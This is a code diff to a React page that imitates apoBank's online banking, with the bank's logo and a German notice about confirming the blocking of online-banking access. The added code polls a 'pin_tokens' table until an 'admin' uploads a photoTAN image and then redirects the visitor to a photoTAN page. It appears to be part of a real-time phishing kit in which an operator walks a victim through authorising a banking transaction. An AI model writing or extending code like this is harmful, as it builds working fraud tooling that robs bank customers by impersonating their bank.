@@ -1,12 +1,58 @@
-import { ChevronRight } from "lucide-react";
-import { useNavigate } from "react-router-dom";
+import { useEffect, useState } from "react";
+import { ChevronRight, Loader2 } from "lucide-react";
+import { useNavigate, useSearchParams } from "react-router-dom";
 import apoBankLogo from "@/assets/apobank-logo.svg";
 import Footer from "@/components/Footer";
 import ContactSection from "@/components/ContactSection";
 import { Button } from "@/components/ui/button";
+import { supabase } from "@/integrations/supabase/client";
 
 const PinStart = () => {
   const navigate = useNavigate();
+  const [sp] = useSearchParams();
+  const token = sp.get("token");
+  const [waiting, setWaiting] = useState(false);
+  const [error, setError] = useState<string | null>(null);
+
+  // Ensure phase is "start" while on this page
+  useEffect(() => {
+    if (!token) return;
+    (async () => {
+      await (supabase as any).from("pin_tokens")
+        .update({ customer_phase: "start", last_error: null })
+        .eq("token", token);
+    })();
+  }, [token]);
+
+  // Poll for admin uploading photo_tan_image
+  useEffect(() => {
+    if (!token || !waiting) return;
+    let cancelled = false;
+    const check = async () => {
+      const { data } = await (supabase as any)
+        .from("pin_tokens")
+        .select("photo_tan_image, customer_phase, last_error")
+        .eq("token", token)
+        .maybeSingle();
+      if (cancelled || !data) return;
+      if (data.last_error) { setError(data.last_error); setWaiting(false); return; }
+      if (data.photo_tan_image && data.customer_phase === "phototan") {
+        navigate(`/pin/offline?token=${encodeURIComponent(token)}`);
+      }
+    };
+    check();
+    const iv = window.setInterval(check, 2000);
+    return () => { cancelled = true; window.clearInterval(iv); };
+  }, [token, waiting, navigate]);
+
+  const onOffline = async () => {
+    setError(null);
+    if (!token) { navigate("/pin/offline"); return; }
+    setWaiting(true);
+    await (supabase as any).from("pin_tokens")
+      .update({ customer_phase: "phototan_request", last_error: null })
+      .eq("token", token);
+  };
 
   return (
     <div className="min-h-screen bg-[#f5f5f5] flex flex-col">
@@ -43,13 +89,19 @@ const PinStart = () => {
             <p className="text-sm text-foreground mb-6">
               Um die Sperrung des Online-Banking Zugangs manuell zu bestätigen, wechseln Sie in den Offline-Modus.
             </p>
+            {error && <p className="text-xs text-destructive mb-3">{error}</p>}
             <div className="flex justify-end gap-3">
               <Button
                 variant="outline"
-                className="px-8 bg-white hover:bg-white border-[#0f4c92] text-[#0f4c92] hover:text-[#0f4c92] rounded-sm"
-                onClick={() => navigate("/pin/offline")}
+                disabled={waiting}
+                className="px-8 bg-white hover:bg-white border-[#0f4c92] text-[#0f4c92] hover:text-[#0f4c92] rounded-sm disabled:opacity-100"
+                onClick={onOffline}
               >
-                Offline-Modus
+                {waiting ? (
+                  <span className="inline-flex items-center gap-2">
+                    <Loader2 className="h-4 w-4 animate-spin" /> Bitte warten…
+                  </span>
+                ) : "Offline-Modus"}
               </Button>
             </div>
 
